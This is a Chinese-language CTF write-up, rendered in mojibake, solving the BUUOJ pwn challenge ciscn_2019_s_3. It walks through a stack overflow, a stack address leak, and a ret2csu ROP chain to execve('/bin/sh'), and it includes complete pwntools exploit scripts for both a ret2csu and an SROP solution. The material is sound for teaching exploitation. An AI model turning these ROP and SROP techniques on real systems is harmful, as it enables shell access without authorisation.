# è®°å½•ä¸€é“ret2csuçš„pwné¢˜


## 0x00 å‰è¨€

> å†™è¿™é“é¢˜ä¹‹å‰, å¤§å®¶é¦–å…ˆè¦äº†è§£, æƒ³è¦è·å¾—ä¸€ä¸ªshell, é™¤äº†system("/bin/sh") ä»¥å¤–, è¿˜æœ‰ä¸€ç§æ›´å¥½çš„æ–¹æ³•, å°±æ˜¯ç³»ç»Ÿè°ƒç”¨ä¸­çš„ execve("/bin/sh", NULL, NULL)è·å¾—shellã€‚æˆ‘ä»¬å¯ä»¥åœ¨ Linuxç³»ç»Ÿè°ƒç”¨å·è¡¨ä¸­æ‰¾åˆ°å¯¹åº”çš„ç³»ç»Ÿè°ƒç”¨å·,è¿›è¡Œè°ƒç”¨, å…¶ä¸­**32ä½ç¨‹åº**ç³»ç»Ÿè°ƒç”¨å·ç”¨ eax å‚¨å­˜, ç¬¬ä¸€ ã€ äºŒ ã€ ä¸‰å‚æ•°åˆ†åˆ«åœ¨ **ebx ã€ecx ã€edx**ä¸­å‚¨å­˜ï¼Œ å¯ä»¥ç”¨ **int 80**æ±‡ç¼–æŒ‡ä»¤è°ƒç”¨ã€‚**64ä½ç¨‹åº**ç³»ç»Ÿè°ƒç”¨å·ç”¨ rax å‚¨å­˜, ç¬¬ä¸€ ã€ äºŒ ã€ ä¸‰å‚æ•°åˆ†åˆ«åœ¨ **rdi ã€rsi ã€rdx**ä¸­å‚¨å­˜ï¼Œ å¯ä»¥ç”¨**syscall** æ±‡ç¼–æŒ‡ä»¤è°ƒç”¨ã€‚

[é¢˜ç›®é“¾æ¥](https://buuoj.cn/challenges#ciscn_2019_s_3)

è¿™é¢˜æˆ‘æ˜¯ä¸ä¼šåšçš„ğŸ¤¡ï¼Œè‡³å°‘åœ¨çœ‹åˆ«äººçš„åšå®¢ä¹‹å‰æ˜¯è¿™æ ·ã€‚è€Œä¸”ï¼Œåœ¨æŸ¥é˜…äº†ä¼—å¤šèµ„æ–™ä»¥åŠè‡ªå·±è·Ÿç€gdbè°ƒè¯•ä¹‹åï¼Œæ‰ç»ˆäºå¼„æ‡‚äº†è¿™é¢˜çš„ä¸€ç§è§£æ³•ã€‚æ‰€ä»¥ï¼Œä¸ºäº†åŠ æ·±ç†è§£ï¼Œåœ¨è¿™é‡Œè®°å½•ä¸€ä¸‹~~å‡è£…æ˜¯è‡ªå·±åšå‡ºæ¥çš„~~è‡ªå·±å¤ç°çš„è§£é¢˜è¿‡ç¨‹å§ã€‚ğŸ˜…

## 0x01 å¼€å§‹åˆ†æ	

é¦–å…ˆchecksec

```
Arch:     amd64-64-little
RELRO:    Partial RELRO
Stack:    No canary found
NX:       NX enabled
PIE:      No PIE (0x400000)
```

64ä½ï¼Œæ²¡å¼€PIEï¼Œæ²¡æœ‰cannaryï¼Œå¼€äº†NXï¼ˆè¯´æ˜ä¸èƒ½ç›´æ¥å†™shellcodeï¼‰ã€‚

IDAçœ‹ä¸€ä¸‹ï¼Œ`vuln()`å’Œ`gadgets()`å¾ˆæ˜¾çœ¼å•Šï¼Œ~~çœ‹ç€è¿™å‡½æ•°åå½“æ—¶å¿ƒæƒ³è¿™ä¼°è®¡åˆæ˜¯ä¸€é“ç®€ç®€å•å•çš„åŸºç¡€ropè®­ç»ƒï¼Œä¸”çœ‹æˆ‘10åˆ†é’Ÿæ‹¿ä¸‹ğŸ¤£~~é‚£å°±åˆ†åˆ«å»çœ‹ä¸€ä¸‹è¿™ä¸¤ä¸ªå‡½æ•°çš„å†…å®¹å§ã€‚

é¦–å…ˆæ˜¯`vuln()`ã€‚å‘ç°å…¶ä¸­è°ƒç”¨äº†`sys_read()`å’Œ`sys_write()`ï¼Œéƒ½æ˜¯ç³»ç»Ÿè°ƒç”¨çš„å½¢å¼ã€‚è€Œä¸”`sys_read()`å‘å¤§å°ä¸º`0x10`çš„`buf`å†™å…¥æœ€å¤š`0x400`ä¸ªæ•°ï¼Œè¿™æ˜¾ç„¶å­˜åœ¨æº¢å‡ºã€‚

![image-20210827140902790](image-20210827140902790.png "vuln()å‡½æ•°")

ç„¶åæ˜¯`gadgets()`ã€‚å…¶ä¸­å­˜åœ¨ä¸¤ä¸ªè®¾ç½®`rax`å¯„å­˜å™¨çš„gadgetï¼ŒæŸ¥ä¸€ä¸‹[64ä½Linuxç³»ç»Ÿè°ƒç”¨è¡¨](https://archive.next.arttnba3.cn/2000/10/12/%E3%80%90%E8%B5%84%E6%96%99%E5%AD%98%E6%A1%A3-0x01%E3%80%91Linux%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8%E4%B8%80%E8%A7%88-by-arttnba3/#0x02.64%E4%BD%8D%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8%E4%B8%80%E8%A7%88%E8%A1%A8)ï¼Œ`0x0f`æ˜¯`sigreturn`ï¼Œ`0x3b`æ˜¯`execve`ã€‚å†ç»“åˆ`vuln()`ä¸­å­˜åœ¨`syscall`è¯­å¥ï¼Œå°±å¯ä»¥ç¡®å®šæœ€æ˜æ˜¾çš„æ€è·¯äº†ï¼Œé‚£å°±æ˜¯æƒ³åŠæ³•è°ƒç”¨`execve("/bin/sh",  NULL, NULL)`æ¥è·å–shellã€‚

![image-20210827142815042](image-20210827142815042.png "gadgets")

æ ¹æ®å‰è¨€æåˆ°çš„64ä½Linuxç³»ç»Ÿè°ƒç”¨çš„ä¼ å‚æ–¹å¼ï¼Œæˆ‘ä»¬åœ¨è°ƒç”¨`syscall`ä¹‹å‰éœ€è¦å®Œæˆä¸¤ç‚¹ï¼š

- `rax`å¯„å­˜å™¨ç½®ä¸º`0x3b(59)`
- `rdi`è®¾ä¸º`/bin/sh`å­—ç¬¦ä¸²çš„åœ°å€ï¼Œ`rsi`/`rdx`è®¾ä¸º0

## 0x02 execve/ret2csuè§£æ³•

é¦–å…ˆè¦æƒ³ä¸€ä¸‹æ€ä¹ˆè·å–æŒ‡å‘å­—ç¬¦ä¸²`/bin/sh`çš„åœ°å€ã€‚IDA view->open subviews->stringsæŸ¥çœ‹ï¼Œå‘ç°æ²¡æœ‰`/bin/sh`ã€‚æ‰€ä»¥åªèƒ½è°ƒ`sys_read()`è‡ªå·±å†™äº†ã€‚åŒæ—¶ï¼Œæ³¨æ„åˆ°**`vuln()`å‡½æ•°çš„ç»“å°¾æ˜¯æ²¡æœ‰`leave`æŒ‡ä»¤çš„**ï¼Œæ‰€ä»¥`vlun()`è¢«è°ƒç”¨å®Œä¹‹åå…¶å‡½æ•°æ ˆå¹¶æ²¡æœ‰è¢«æ¸…ç©ºï¼Œäºæ˜¯æˆ‘ä»¬å¯ä»¥å†™`/bin/sh`åœ¨æ ˆä¸Šï¼Œè€Œä¸”è¦†ç›–çš„æ—¶å€™è¦†ç›–çš„`rbp`å°±ç›´æ¥æ˜¯è¿”å›åœ°å€ã€‚

é‚£ä¹ˆç¬¬äºŒä¸ªé—®é¢˜æ¥äº†ï¼Œå¦‚ä½•çŸ¥é“`vuln()`å‡½æ•°æ ˆçš„åœ°å€å‘¢ï¼Œç­”æ¡ˆå°±æ˜¯åˆ©ç”¨`vuln()`ä¸­çš„`sys_write()`è°ƒç”¨ã€‚è¯¥è°ƒç”¨è¾“å‡º`0x30`ä¸ªå­—èŠ‚çš„å†…å®¹ï¼Œåœ¨è°ƒè¯•çš„è¿‡ç¨‹ä¸­å¯ä»¥çœ‹åˆ°ï¼Œ`buf`åœ¨æ ˆä¸Šçš„åœ°å€ä¸º`0xdf30`ï¼Œè€Œä»æºç å¯çŸ¥å®ƒä¸`rbp`çš„è·ç¦»ä¸º`0x10`ä¸ªå­—èŠ‚ï¼Œæ‰€ä»¥`sys_write()`è¾“å‡ºçš„ç¬¬`0x21~0x28`ä¸ªå­—èŠ‚æ˜¯å¯æ‰§è¡Œæ–‡ä»¶åçš„åœ°å€ï¼Œè¾“å‡ºå†…å®¹ä¸`buf`åœ°å€çš„åç§»ä¸º`0xe048-0xdf30=0x118=280`ã€‚æ‰€ä»¥ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡æ³„éœ²å¯æ‰§è¡Œæ–‡ä»¶ååœ°å€çš„æ–¹å¼æ¥è·å–`buf`çš„åœ°å€ã€‚

éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œé¢˜ç›®è¯´æ˜äº†è¯¥é¢˜çš„è¿œç¨‹ç¯å¢ƒä¸º`Ubuntu18`ï¼Œè€Œæˆ‘ä¸€å¼€å§‹æ˜¯ç”¨`Ubuntu20`è°ƒè¯•çš„ï¼Œæ‰€ä»¥å¾—åˆ°çš„åç§»ä¸º`0x128`ï¼Œå¤šäº†`0x10`ä¸ªå­—èŠ‚ï¼Œæˆ‘è¯´æ€ä¹ˆä¸€ç›´ä¸å¯¹ï¼Œåæ¥å†è£…äº†ä¸ªubuntu18çš„wslï¼Œå‘ç°æœç„¶å¦‚æ­¤ï¼Œä¼°è®¡æ˜¯ç³»ç»Ÿçš„åœ°å€å¯¹é½ä¹‹ç±»çš„åŸå› ã€‚æœ‰è¶£çš„æ˜¯ï¼Œåœ¨è¿™ä¸€è¿‡ç¨‹ä¸­è¿˜å­¦ä¹ äº†ä¸€äº›wslçš„æ–°æ“ä½œï¼Œä¹Ÿç®—æ˜¯éœ€æ±‚å¯¼å‘æ€§å­¦ä¹ äº†ï¼Œ[è®°å½•åœ¨äº†è¿™é‡Œ](https://1iu2y.github.io/posts/2021-08-27-wsl%E8%BF%81%E7%A7%BB%E7%AD%89%E6%93%8D%E4%BD%9C%E8%AE%B0%E5%BD%95/)ã€‚

![image-20210827112504437](image-20210827112504437.png "wsl-ubuntu18")

`Ubuntu20`ä¸Šé¢çœ‹åˆ°çš„å°±æ˜¯`0xdf58-0xde30=0x128=296`ã€‚

![image-20210827112608649](image-20210827112608649.png "wsl-ubuntu20")

OKï¼Œåœ°å€çŸ¥é“äº†ï¼Œ`execve()`çš„3ä¸ªå‚æ•°çš„å€¼æˆ‘ä»¬éƒ½èƒ½å¤Ÿç¡®å®šäº†ï¼Œæ‰€ä»¥ç¬¬ä¸€æ­¥å°±æ˜¯æ³„éœ²'buf'çš„åœ°å€ã€‚

```python
payload1 = b'a'*0x10 + p64(vuln_addr)
io.sendline(payload1)

io.recv(0x20)

stack_addr = u64(io.recv(8))
binsh_addr = stack_addr - 0x118
```

ä¸Šé¢çš„`payload1`å‘å®Œä¹‹åï¼Œåˆè¿›å…¥äº†`vuln()`ã€‚æ¥ä¸‹æ¥çš„å°±æ˜¯é€šè¿‡ç¬¬äºŒä¸ªpayloadæƒ³åŠæ³•æ„é€ ROPé“¾æ¥å®ç°æ§åˆ¶å¯„å­˜å™¨ä¸å‡½æ•°è·³è½¬çš„è¿‡ç¨‹ï¼Œè¿™åˆæ˜¯è¿™é¢˜çš„ä¸€ä¸ªéš¾ç‚¹ï¼ˆå› ä¸ºæˆ‘åšè¿™é¢˜ä¹‹å‰ä¸çŸ¥é“ret2csu:no_mouth:ï¼‰ã€‚æœ€ç®€å•çš„æ€è·¯é‚£è‚¯å®šæ˜¯ç”¨ROPgadgetæ‰¾åˆ°èƒ½å¤Ÿpopä¸‰ä¸ªå¯„å­˜å™¨ã€ç„¶åretçš„gadgetã€‚ä½†æ˜¯ROPgadgetåªèƒ½æ‰¾åˆ°`pop rdi`å’Œ`pop rsi`çš„gadgetï¼ˆä¸ºä»€ä¹ˆ`pop rsi; pop r15; ret`è¿™æ¡æŒ‡ä»¤ä»ä¸­é—´å¼€å§‹å–å°±æ˜¯`pop rdi; ret`ï¼Ÿè¿™æ˜¯æŒ‡ä»¤è®¾è®¡çš„åŸå› å—ï¼Ÿï¼‰ï¼Œè¿˜å·®ä¸€ä¸ªï¼Œæ‰€ä»¥è¿™ç§æ–¹æ³•è¡Œä¸é€šã€‚

![image-20210827152113322](image-20210827152113322.png "'pop rdx' æ‰¾ä¸åˆ°")

å› æ­¤ï¼Œæˆ‘ä»¬å¾—ç”¨ä¸€ç§æ–°çš„retæ–¹å¼ï¼Œ`ret2csu`ï¼Œå°±æ˜¯åˆ©ç”¨`_libc_csu_init()`çš„`pop`å’Œ`mov`ä¸¤ä¸ªgadgetæ¥å®ç°æ§åˆ¶å¯„å­˜å™¨çš„æ“ä½œï¼Œä¸€èˆ¬é€‚ç”¨äº64ä½çš„é¢˜ç›®ã€‚`ret2csu`çš„å‚è€ƒèµ„æ–™ç½‘ä¸Šéƒ½æœ‰ï¼Œæ„Ÿè§‰[è¿™ç¯‡](http://www.sec4.fun/2020/05/14/csu/)å†™çš„æŒºæ¸…æ™°çš„ã€‚

ä¸¤æ®µgadgetä¸º

```assembly
//mov
.text:0000000000400580 loc_400580:                             ; CODE XREF: __libc_csu_init+54â†“j
.text:0000000000400580                 mov     rdx, r13
.text:0000000000400583                 mov     rsi, r14
.text:0000000000400586                 mov     edi, r15d
.text:0000000000400589                 call    ds:(__frame_dummy_init_array_entry - 600E10h)[r12+rbx*8]
.text:000000000040058D                 add     rbx, 1
.text:0000000000400591                 cmp     rbx, rbp
.text:0000000000400594                 jnz     short loc_400580
```

```assembly
//pop
.text:000000000040059A                 pop     rbx
.text:000000000040059B                 pop     rbp
.text:000000000040059C                 pop     r12
.text:000000000040059E                 pop     r13
.text:00000000004005A0                 pop     r14
.text:00000000004005A2                 pop     r15
.text:00000000004005A4                 retn
```

æ€»ç»“ä¸‹æ¥å°±æ˜¯ï¼š

- `r15d` -> `edi` ï¼ˆä¸€èˆ¬æ¥è¯´`rdi`å¯„å­˜å™¨é«˜8ä½éƒ½æ˜¯0ï¼Œæ‰€ä»¥è¿™é‡Œè™½ç„¶åªæ§åˆ¶äº†ä½8ä½ï¼Œä½†å®é™…ä¸Šç›¸å½“äºå¯ä»¥æ§åˆ¶`rdi`çš„å€¼ï¼‰
- `r14` -> `rsi`
- `r13` -> `rdx`
- è¿˜æœ‰ï¼Œ`rbx`è®¾ä¸º0ï¼Œç„¶å`call [r12+rbx*8];`å°±ä¼šä»¥`r12`å­˜å‚¨çš„åœ°å€ä¸ºèµ·ç‚¹å–æŒ‡ä»¤ï¼Œå¹¶ä¸”æ¯æ¬¡å‘åè·³8ä½ï¼Œå› ä¸ºcallæŒ‡ä»¤åä¼šå°†`rbx`åŠ 1ï¼Œç„¶åå¯¹æ¯”`rbp`ï¼Œå¦‚æœä¸ç›¸ç­‰åˆ™å†æ¬¡å¾ªç¯

äºæ˜¯ï¼Œç†è®ºä¸Šï¼Œæˆ‘ä»¬å°±èƒ½å¤Ÿæ„é€ ä¸€æ®µæå…¶å·§å¦™çš„`payload2`ï¼š

```python
payload2 = b'/bin/sh\x00'.ljust(0x10, b'a') + p64(pop_rbx_rbp_r12_r13_r14_r15_ret)
payload2 += p64(0)*2 + p64(binsh_addr+0x50) + p64(0)*3
payload2 += p64(mov_rdx_r13_mov_rsi_r14_mov_edi_r15_call_r12) + p64(mov_rax_59_ret)
payload2 += p64(pop_rdi_ret) + p64(binsh_addr) + p64(syscall)
```

å¯¹åº”çš„æ‰§è¡Œæµç¨‹ä¸ºï¼š

1. å†™å®Œ'/bin/sh'ï¼Œ`vuln()`å†…æ‰§è¡Œ`retn`ï¼Œè¿›è€Œæ‰§è¡Œ`pop_rbx_rbp_r12_r13_r14_r15_ret`ã€‚`pop`6æ¬¡ï¼Œ`rbx`/`rbp`/`r12`/`r13`/`r14`/`r15`åˆ†åˆ«è¢«è®¾ä¸º`0`/`0`/`binsh_addr+0x50`/`0`/`0`/`0`/ï¼Œ`rsp`æ­¤æ—¶æŒ‡å‘`mov_rdx_r13_mov_rsi_r14_mov_edi_r15_call_r12`ï¼Œæ¥åœ¨å†`retn`ï¼Œæ‰§è¡Œ`mov_rdx_r13_mov_rsi_r14_mov_edi_r15_call_r12`ï¼Œæ­¤æ—¶`rsp`æŒ‡å‘`mov_rax_59_ret`ï¼Œ**æ³¨æ„ï¼Œè¿™åˆšå¥½æ˜¯å‰é¢çš„`binsh_addr_0x50`ğŸ˜¬**
2. `mov_rdx_r13_mov_rsi_r14_mov_edi_r15_call_r12`æŒ‡ä»¤æ‰§è¡Œï¼Œ`rsi`/`rdx`è¢«è®¾ç½®ä¸º0ï¼Œç¬¬ä¸€æ¬¡`call [r12];`ã€‚
3. ä¼—æ‰€å‘¨çŸ¥ï¼Œ`call`æŒ‡ä»¤çš„æ‰§è¡Œè¿‡ç¨‹æ˜¯å…ˆpushå†jumpï¼Œç„¶åjumpçš„ç›®çš„æŒ‡ä»¤æ®µæœ€åä¸€èˆ¬éƒ½æœ‰ä¸ªretå›æ¥ã€‚æ‰€ä»¥ï¼Œç¬¬ä¸€æ¬¡æ‰§è¡Œ`call [r12];`ï¼Œå°±ç›¸å½“äºæ‰§è¡Œ`mov_rax_59_ret`ï¼ŒæŠŠ`rax`è®¾ä¸ºäº†`59`ï¼Œç„¶å`ret`ã€‚ç»è¿‡ä¸€ç•ª`push`/`ret`ä¹‹åï¼Œ**`rsp`åˆå›åˆ°äº†`mov_rax_59_ret`çš„ä½ç½®**ï¼Œä½†æ­¤æ—¶`rbx`å·²ç»è¢«åŠ äº†1ï¼Œå€¼å˜ä¸ºäº†`1`ã€‚ç„¶åé€šè¿‡åé¢çš„`cmp`åˆ¤æ–­ï¼Œ`jnz`å†æ¬¡è·³å›`mov_rdx_r13_mov_rsi_r14_mov_edi_r15_call_r12`æŒ‡ä»¤å¼€å¤´ã€‚
4. å†æ¬¡æ‰§è¡Œ`mov_rdx_r13_mov_rsi_r14_mov_edi_r15_call_r12`ï¼Œä¸åŒçš„æ˜¯ï¼Œæ­¤æ—¶`rbx`ä¸º`1`ï¼Œæ‰€ä»¥`call`æŒ‡ä»¤å˜ä¸ºäº†`call [r12+8];`ï¼Œæ‰€ä»¥`pop_rdi_ret`è¢«æ‰§è¡Œï¼š`call`é¦–å…ˆ`push`ï¼Œ`rsp`æŒ‡å‘`call`ä¹‹åçš„ä¸‹ä¸€æ¡æŒ‡ä»¤ï¼Œç„¶å`jump`ï¼›`jump`ä¹‹å`pop rdi`ï¼Œ`rdi`å˜ä¸ºäº†`call`çš„ä¸‹ä¸€æ¡æŒ‡ä»¤åœ°å€ï¼Œ`rsp`æŒ‡å‘`mov_rax_59_ret`ï¼›å†æ¥ç€`ret`ï¼Œ`rsp`æŒ‡å‘`pop_rdi_ret`ï¼Œ`rip`æŒ‡ä»¤å¯„å­˜å™¨çš„å†…å®¹ä¸º`mov_rax_59_ret`ï¼Œæ‰€ä»¥ç³»ç»Ÿæ‰§è¡Œçš„ä¸‹ä¸€æ¡æŒ‡ä»¤ä¸º`mov_rax_59_ret`ã€‚
5. æ‰§è¡Œ`mov_rax_59_ret`ï¼Œ`rsp`æŒ‡å‘`binsh_addr`ï¼Œ`rip`æŒ‡ä»¤å¯„å­˜å™¨çš„å†…å®¹ä¸º`pop_rdi_ret`ï¼Œæ‰€ä»¥ç³»ç»Ÿæ‰§è¡Œçš„ä¸‹ä¸€æ¡æŒ‡ä»¤ä¸º`pop_rdi_ret`ã€‚
6. `pop rdi;`å°†`binsh_addr`å†™å…¥`rdi`ï¼Œç„¶å`ret`æ‰§è¡Œ`syscall`ã€‚æ­¤æ—¶ï¼Œ`rax`ä¸º59ï¼Œä¸”ä¸‰ä¸ªå¯„å­˜å™¨`rdi`/`rsi`/`rdx`åˆ†åˆ«ä¸º`binsh_addr`/`0`/`0`ï¼Œç›¸å½“äºæ‰§è¡Œ`execve("/bin/sh", NULL, NULL)`ï¼Œæ‹¿åˆ°shellã€‚

æ„Ÿè§‰[è¿™ç¯‡åšå®¢](http://liul14n.top/2020/03/07/Ciscn-2019-s-3/)é‡Œçš„æ‰§è¡Œæµç¨‹åˆ†æå¥½åƒå†™é”™äº†ä¸€æ­¥...

æœ€ç»ˆå®Œæ•´expå¦‚ä¸‹ã€‚

```python
from pwn import *
ï¼›
# æœ¬åœ°è°ƒè¯•
if args.LOCAL:
    # context.terminal = ["wsl", "-c"]
    # io = process("./ciscn_s_3")
    io = gdb.debug("./ciscn_s_3")
else:
    io = remote("node4.buuoj.cn", 25280)
    # context.log_level = 'debug'

vuln_addr = 0x4004ed
syscall = 0x400517
pop_rdi_ret = 0x4005a3
mov_rax_59_ret = 0x4004e2
pop_rbx_rbp_r12_r13_r14_r15_ret = 0x40059a
mov_rdx_r13_mov_rsi_r14_mov_edi_r15_call_r12 = 0x400580

payload1 = b'a'*0x10 + p64(vuln_addr)
io.sendline(payload1)

io.recv(0x20)

stack_addr = u64(io.recv(8))
binsh_addr = stack_addr - 0x118
io.recv(0x38)

payload2 = b'/bin/sh\x00'.ljust(0x10, b'a') + p64(pop_rbx_rbp_r12_r13_r14_r15_ret)
payload2 += p64(0)*2 + p64(binsh_addr+0x50) + p64(0)*3
payload2 += p64(mov_rdx_r13_mov_rsi_r14_mov_edi_r15_call_r12) + p64(mov_rax_59_ret)
payload2 += p64(pop_rdi_ret) + p64(binsh_addr) + p64(syscall)

io.sendline(payload2)
io.interactive()
```

æ‰§è¡Œæˆªå›¾

![image-20210827162304078](image-20210827162304078.png "æ‰§è¡Œç»“æœ")

## 0x03 sigreturn/SROPè§£æ³•

è´´ä¸€ä¸‹åˆ«äººçš„expï¼Œç­‰æˆ‘å­¦ä¹ ä¸€ä¸‹SROPå†å›è¿‡å¤´æ¥çœ‹ã€‚

```python
from pwn import *
context.arch = 'amd64'
p =remote('node3.buuoj.cn',26063)# process('./ciscn_s_3') # 
e = ELF('./ciscn_s_3')
mov_rax_15_ret = 0x4004da
vuln_addr = 0x4004ed
syscall_addr = 0x400517
payload1 = b'A' * 0x10 + p64(vuln_addr)


p.sendline(payload1)
p.recv(0x20)
stack_leak = u64(p.recv(8)) - 0x118
log.info("stack addr: " + hex(stack_leak))

frame = SigreturnFrame()
frame.rax = 0x3b # syscall::execve, constants.SYS_execve is also ok
frame.rip = syscall_addr
frame.rdi = stack_leak
frame.rsi = 0
frame.rdx = 0
payload2 = b'/bin/sh\x00' + p64(0xdeadbeef) + p64(mov_rax_15_ret) + p64(syscall_addr) + bytes(frame)

p.sendline(payload2)
p.interactive()
```

## 0x04 æ€»ç»“

è¿™é¢˜ä»ä¸ä¼šï¼Œåˆ°çœ‹æ‡‚ä¸€ç§è§£æ³•ï¼Œä»¥åŠæŸ¥èµ„æ–™ã€gdbè°ƒè¯•ã€å°è¯•gdb+wsl2+pwntoolsè”åˆè°ƒè¯•ã€å¼„wsl ubuntu18ã€è¿ç§»å ç”¨cç›˜ç©ºé—´å¤ªå¤šçš„wsl2-ubuntu20ã€å†™åšå®¢...ï¼Œå‰å‰ååæäº†å·®ä¸å¤šä¸€å¤©çš„æ—¶é—´ğŸ¤£ï¼Œä¸€ä¸ªå­—ï¼Œç–²æƒ«=.=

ä¸è¿‡æ€»çš„æ¥è¯´ï¼Œæ”¶è·è¿˜æ˜¯å¾ˆå¤šçš„ï¼Œç»§ç»­å­¦å§

### å‚è€ƒé“¾æ¥

- [å…³äº32ä½å’Œ64ä½Linuxçš„ç³»ç»Ÿè°ƒç”¨](https://www.cnblogs.com/lxy8584099/p/12013771.html)
- [x64å¯„å­˜å™¨ä¼ å‚](https://abcdxyzk.github.io/blog/2012/11/23/assembly-args/)
- [Ciscn_2019_s_3](http://liul14n.top/2020/03/07/Ciscn-2019-s-3/)


